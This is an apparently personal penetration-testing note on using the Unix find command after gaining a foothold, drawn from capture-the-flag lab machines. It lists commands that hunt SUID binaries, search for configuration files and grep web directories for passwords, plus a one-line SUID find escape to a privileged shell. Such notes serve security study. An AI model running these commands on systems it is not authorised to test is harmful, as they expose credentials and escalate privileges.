# find

The `find` utility is the primary file and directory search tool on Unix-like operating systems. In an offensive context, it is the foundational tool for post-foothold enumeration, used to hunt for credentials, configuration files, SUID binaries, and group-writable directories.

---

## Commands Used

### Hunting for SUID/SGID Binaries
```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```
Used on: **DevArea**, **Gaara**, **vulnversity**, **Binex**, **blog**, **bookstoreoc**, **kenobi**, **rrootme**

- `-perm -4000` — matches files with the SUID bit set.
- `-u=s` — alternative syntax for SUID bit.
- `2>/dev/null` — suppresses "Permission denied" errors for clean output.

### Searching for Configuration and Credential Files
```bash
find / -type f -name "*.txt" -o -name "*.conf" -o -name "*.ini" 2>/dev/null | grep -v proc
find / -name "*.yml" -o -name "*.yaml" -o -name "docker-compose*" 2>/dev/null
```
Used on: **Kobold**, **Silentium**, **cctv**, **Ide**, **Internal**, **biblioteca**

- `-o` — acts as a logical OR to combine multiple name patterns.
- `grep -v proc` — excludes the noisy `/proc` filesystem from the results.

### Finding Files Owned by Specific Users or Groups
```bash
find / -user drac 2>/dev/null
find / -group admin 2>/dev/null
find / -type f -executable -user deku 2>/dev/null
```
Used on: **Ide**, **Team**, **yueiua**

- `-user` — filters results to only files owned by the specified user.
- `-group` — filters results to only files owned by the specified group.
- `-executable` — filters results to files the current user has execution rights for.

### Executing Commands on Found Files (Credential Grepping)
```bash
find /var/www/html -type f -exec grep -l -i "password\|DB_PASSWORD" {} \; 2>/dev/null
```
Used on: **billing**, **vulnnetinternal**

- `-exec` — runs the specified command on each matched file.
- `{}` — acts as a placeholder for the current file path.
- `\;` — terminates the `-exec` command.

### Escalating Privileges via SUID `find`
```bash
find . -exec /bin/sh -p \; -quit
```
Used on: **Binex**

- `-p` — passed to `sh` to preserve the effective UID (SUID) rather than dropping it.
- `-quit` — stops `find` after the first execution so you only get one shell instead of a loop.

## Related
- [suid-find-escape.md](../../privesc/linux/suid-find-escape.md)
- [linux-enumeration.md](../../exploits/enumeration/linux-enumeration.md)
